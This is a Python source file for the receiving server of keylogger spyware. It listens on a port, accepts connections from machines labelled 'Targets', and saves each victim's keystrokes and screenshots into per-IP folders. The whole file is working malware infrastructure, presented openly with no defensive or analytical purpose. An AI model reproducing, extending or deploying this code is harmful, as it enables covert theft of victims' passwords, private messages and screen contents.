import socket
import threading
import os
import io
from PIL import Image
from datetime import datetime

IP="0.0.0.0"
PORT=12345

SPECIAL_KEYS = {
    "Key.space": " ",
    "Key.enter": "\n",
    "Key.tab": "\t",
    "Key.backspace": "[BKSP]",
    "Key.shift": "[SHIFT]",
    "Key.shift_r": "[SHIFT]",
    "Key.ctrl_l": "[CTRL]",
    "Key.ctrl_r": "[CTRL]",
    "Key.alt_l": "[ALT]",
    "Key.alt_r": "[ALT]",
    "Key.caps_lock": "[CAPS]",
    "Key.esc": "[ESC]",
    "Key.delete": "[DEL]",
}

#start the server and wait for incoming clients
def start_server():
    # create the targets folder if it doesn't exists
    os.makedirs("Targets", exist_ok=True)
    targets=set()
    server_socket:socket.socket= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((IP, PORT))
    server_socket.listen()
    print(f"Server listening on {IP}:{PORT}")
    while True:
        conn, addr = server_socket.accept()
        #only allow one connection from each machine
        if addr[0] not in targets:
            targets.add(addr[0])
            client_handler = HandleClients(conn,addr,targets)
            client_handler.start()
            print(f"Connection from {addr} has been established!")

#write the keys into a log
def write_to_file(key,addr):
    #create a folder for each target
    folder=r"Targets\data of {}".format(addr[0])
    os.makedirs(folder, exist_ok=True)
    with open(r"{}\KeyLog for {}.txt".format(folder, addr[0]), "a") as f:
        if key in SPECIAL_KEYS:
            text = SPECIAL_KEYS[key]
        else:
            text = key.replace("'","")
        #write to file
        f.write(text)

#each client starts a new thread
class HandleClients(threading.Thread):
    def __init__(self, conn,addr,targets):
        super().__init__()
        self.conn = conn
        self.addr=addr
        self.targets=targets
    def run(self):
        while True:
            try:
                self.receive_msg()
            except Exception as e:
                print(f"Error: {e}")
                self.targets.remove(self.addr[0])
                break

    #function extracts the cmd to find the massage type
    def receive_msg(self):
        cmd_length=int.from_bytes(self.conn.recv(4),byteorder="big")
        cmd=self.conn.recv(cmd_length).decode()
        if cmd=="key":
            self.handle_keys()
        if cmd=="image":
            self.handle_screenshots()

    #Function makes sure we receive the proper amount of data
    def receive_exact_amount(self, length):
        data=b''
        while len(data)<length:
            chunk=self.conn.recv(length-len(data))
            if not chunk:
                (print(f"error while receiving data from {self.addr}"))
                return
            data+=chunk
        return data

    def handle_keys(self):
        msg_length = int.from_bytes(self.conn.recv(4),byteorder="big")
        msg = self.receive_exact_amount(msg_length).decode()
        print(f"Received from {self.addr}: {msg}")
        write_to_file(msg,self.addr)


    def handle_screenshots(self):
        os.makedirs(r"Targets\data of {}\Screenshots".format(self.addr[0]), exist_ok=True)
        msg_length=int.from_bytes(self.conn.recv(4),byteorder="big")
        img_bytes=self.receive_exact_amount(msg_length)
        #save image
        image=Image.open(io.BytesIO(img_bytes))
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        image.save(r"Targets\data of {}\Screenshots\Screenshot {}.png".format(self.addr[0],timestamp))
        print(f"received screenshot from {self.addr}")

if __name__ == "__main__":
    start_server()